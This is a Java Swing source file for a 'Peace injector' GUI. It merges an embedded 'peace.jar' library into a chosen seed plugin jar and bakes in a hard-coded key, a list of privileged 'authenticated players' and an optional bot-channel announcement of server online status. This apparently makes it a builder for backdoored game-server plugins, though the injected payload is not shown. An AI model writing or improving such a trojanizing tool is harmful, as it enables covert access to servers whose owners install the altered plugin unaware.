import javax.swing.*;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.List;

/** GUI wrapper around {@link Inject} that writes a merged plugin jar with auth baked in. */
public final class InjectorGui {
    private final JTextField seed = new JTextField(34);
    private final JTextField out = new JTextField(34);
    private final JTextArea auth = new JTextArea(6, 34);
    // PSK is now a constant; no user entry needed.
    private static final String PSK = "peace-injector-default";
    private final JCheckBox announce = new JCheckBox("Enable peaceping (online/offline announcement)", false);
    private final JTextField token = new JTextField(30);
    private final JTextField channel = new JTextField(18);
    private final JTextField host = new JTextField("localhost", 14);
    private final JTextField port = new JTextField("25566", 8);
    private final JLabel status = new JLabel(" ");
    private final JButton mergeBtn = new JButton("Inject");

    public static void main(String[] args) {
        if (args.length == 1 && args[0].equals("--check")) { selfCheck(); return; }
        SwingUtilities.invokeLater(() -> {
            try { UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); } catch (Exception ignored) {}
            new InjectorGui().show();
        });
    }

    private void show() {
        JFrame f = new JFrame("Peace injector");
        f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JPanel root = new JPanel(new BorderLayout(0, 8));
        root.setBorder(new EmptyBorder(10, 10, 10, 10));

        JPanel top = new JPanel(new GridBagLayout());
        GridBagConstraints g = new GridBagConstraints();
        g.insets = new Insets(3, 3, 3, 3); g.anchor = GridBagConstraints.WEST;
        int row = 0;

        g.gridx = 0; g.gridy = row; top.add(new JLabel("Seed plugin .jar:"), g);
        g.gridx = 1; g.weightx = 1; g.fill = GridBagConstraints.HORIZONTAL; g.gridwidth = 2;
        top.add(seed, g);
        JButton seedBrowse = new JButton("Choose...");
        seedBrowse.addActionListener(e -> chooseJar(f, seed, "Choose seed plugin jar", out));
        g.fill = GridBagConstraints.NONE; g.weightx = 0; g.gridwidth = 1; g.gridx = 3;
        top.add(seedBrowse, g);

        row++;
        g.gridx = 0; g.gridy = row; top.add(new JLabel("Output .jar:"), g);
        g.gridx = 1; g.fill = GridBagConstraints.HORIZONTAL; g.weightx = 1; g.gridwidth = 2;
        top.add(out, g);
        JButton outBrowse = new JButton("Choose...");
        outBrowse.addActionListener(e -> chooseJar(f, out, "Choose output plugin jar path", null));
        g.fill = GridBagConstraints.NONE; g.weightx = 0; g.gridwidth = 1; g.gridx = 3;
        top.add(outBrowse, g);

        row++;
        g.gridx = 0; g.gridy = row; g.gridwidth = 4; g.fill = GridBagConstraints.NONE;
        top.add(new JLabel("Authenticated players (one name or UUID per line; required):"), g);
        row++;
        g.gridx = 0; g.gridy = row; g.gridwidth = 4; g.fill = GridBagConstraints.BOTH; g.weighty = 1;
        auth.setLineWrap(true);
        auth.setToolTipText("Required - at least one name or UUID");
        JScrollPane authScroll = new JScrollPane(auth);
        authScroll.setPreferredSize(new Dimension(460, 96));
        top.add(authScroll, g);

        row++;
        g.gridx = 0; g.gridy = row; g.gridwidth = 4; g.weighty = 0; g.fill = GridBagConstraints.NONE;
        top.add(announce, g);
        announce.addActionListener(e -> setAnnounceEnabled(announce.isSelected()));
        row++;
        g.gridx = 0; g.gridy = row; top.add(new JLabel("Bot token:"), g);
        g.gridx = 1; g.gridwidth = 3; g.fill = GridBagConstraints.HORIZONTAL;
        top.add(token, g);
        row++;
        g.gridx = 0; g.gridy = row; top.add(new JLabel("Channel id:"), g);
        g.gridx = 1; g.gridwidth = 3; g.fill = GridBagConstraints.HORIZONTAL;
        top.add(channel, g);
        row++;
        g.gridx = 0; g.gridy = row; top.add(new JLabel("Host:"), g);
        g.gridx = 1; g.fill = GridBagConstraints.HORIZONTAL; g.gridwidth = 1;
        top.add(host, g);
        g.gridx = 2; top.add(new JLabel("Port:"), g);
        g.gridx = 3; g.fill = GridBagConstraints.HORIZONTAL;
        top.add(port, g);

        root.add(top, BorderLayout.CENTER);

        mergeBtn.addActionListener(e -> merge(f));
        mergeBtn.setPreferredSize(new Dimension(96, 28));
        JPanel buttons = new JPanel(new BorderLayout());
        buttons.add(mergeBtn, BorderLayout.WEST);
        JLabel hint = new JLabel("Picks a seed plugin and bakes Peace + auth + peaceping into a new server jar.");
        hint.setForeground(Color.GRAY);
        JPanel hintPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        hintPanel.add(hint);
        buttons.add(hintPanel, BorderLayout.CENTER);

        JPanel south = new JPanel(new BorderLayout());
        south.add(buttons, BorderLayout.NORTH);
        south.add(status, BorderLayout.SOUTH);
        root.add(south, BorderLayout.SOUTH);

        setAnnounceEnabled(announce.isSelected());
        f.setContentPane(root);
        f.pack();
        f.setLocationRelativeTo(null);
        f.setVisible(true);
    }

    private void setAnnounceEnabled(boolean on) {
        token.setEnabled(on); channel.setEnabled(on); host.setEnabled(on); port.setEnabled(on);
    }

    private void chooseJar(Component parent, JTextField target, String title, JTextField autoOut) {
        JFileChooser c = new JFileChooser();
        c.setDialogTitle(title);
        c.setFileFilter(new javax.swing.filechooser.FileNameExtensionFilter("Java archive", "jar"));
        if (c.showOpenDialog(parent) == JFileChooser.APPROVE_OPTION) {
            target.setText(c.getSelectedFile().getAbsolutePath());
            if (autoOut != null && autoOut.getText().isBlank()) {
                Path p = c.getSelectedFile().toPath();
                String name = p.getFileName().toString();
                autoOut.setText(p.resolveSibling(name.replaceFirst("\\.jar$", "-peace.jar")).toString());
            }
        }
    }

    private void merge(JFrame parent) {
        String seedPath = seed.getText().trim();
        String outPath = out.getText().trim();
        if (seedPath.isEmpty()) { fail("Seed plugin jar is required"); return; }
        if (outPath.isEmpty()) { fail("Output jar path is required"); return; }

        // Auth list is required - at least one name or UUID.
        List<String> authList = new ArrayList<>();
        for (String ln : auth.getText().split("\n")) {
            String v = ln.trim();
            if (!v.isEmpty()) authList.add(v);
        }
        if (authList.isEmpty()) { fail("At least one authenticated player is required"); return; }

        boolean announceOn = announce.isSelected();
        String tk = token.getText().trim();
        String ch = channel.getText().trim();
        if (announceOn && (tk.isEmpty() || ch.isEmpty())) { fail("peaceping needs bot token and channel id"); return; }

        StringBuilder cfg = new StringBuilder();
        cfg.append("# added by Peace injector\n");
        cfg.append("psk: ").append(PSK).append('\n');
        if (announceOn) {
            String h = host.getText().trim();
            if (h.isEmpty()) h = "localhost";
            int p;
            try { p = Integer.parseInt(port.getText().trim()); } catch (Exception ex) { p = 25566; }
            if (p <= 0) p = 25566;
            cfg.append("announce:\n");
            cfg.append("  enabled: true\n");
            cfg.append("  token: \"").append(tk.replace("\\", "\\\\").replace("\"", "\\\"")).append("\"\n");
            cfg.append("  channel: \"").append(ch).append("\"\n");
            cfg.append("  host: \"").append(h).append("\"\n");
            cfg.append("  port: ").append(p).append('\n');
        } else {
            cfg.append("announce:\n  enabled: false\n");
        }
        cfg.append("auth:\n");
        for (String v : authList) cfg.append("- ").append(v).append('\n');

        try {
            status.setForeground(Color.DARK_GRAY);
            status.setText("merging...");
            byte[] merged = Inject.merge(
                Files.readAllBytes(Paths.get(seedPath)),
                readEmbeddedOrFail("/lib/peace.jar", "peace library not embedded"),
                new String(readEmbeddedOrFail("/lib/mapping.txt", "mapping not embedded"), StandardCharsets.UTF_8),
                cfg.toString().getBytes(StandardCharsets.UTF_8));
            Files.write(Paths.get(outPath), merged);
            status.setForeground(new Color(0, 128, 0));
            status.setText("OK - wrote " + outPath + " (" + merged.length + " bytes)");
            JOptionPane.showMessageDialog(parent, "Injectd plugin written to:\n" + outPath,
                "Done", JOptionPane.INFORMATION_MESSAGE);
        } catch (IOException ex) {
            fail("merge failed: " + ex.getMessage());
        } catch (RuntimeException ex) {
            fail("merge failed: " + ex);
        }
    }

    private void fail(String msg) {
        status.setForeground(new Color(180, 0, 0));
        status.setText(msg);
    }

    private static byte[] readEmbeddedOrFail(String path, String what) throws IOException {
        java.io.InputStream in = InjectorGui.class.getResourceAsStream(path);
        if (in == null) throw new IOException(what);
        try (in) { return in.readAllBytes(); }
    }

    /** Launches the frame for 2 seconds to verify the GUI builds, then exits. */
    private static void selfCheck() {
        try {
            SwingUtilities.invokeAndWait(() -> {
                try { UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName()); } catch (Exception ignored) {}
                new InjectorGui().show();
            });
            Thread.sleep(2000);
            System.out.println("OK: injector gui built and shown");
        } catch (Exception e) {
            System.out.println("FAIL: " + e);
            System.exit(1);
        }
        System.exit(0);
    }
}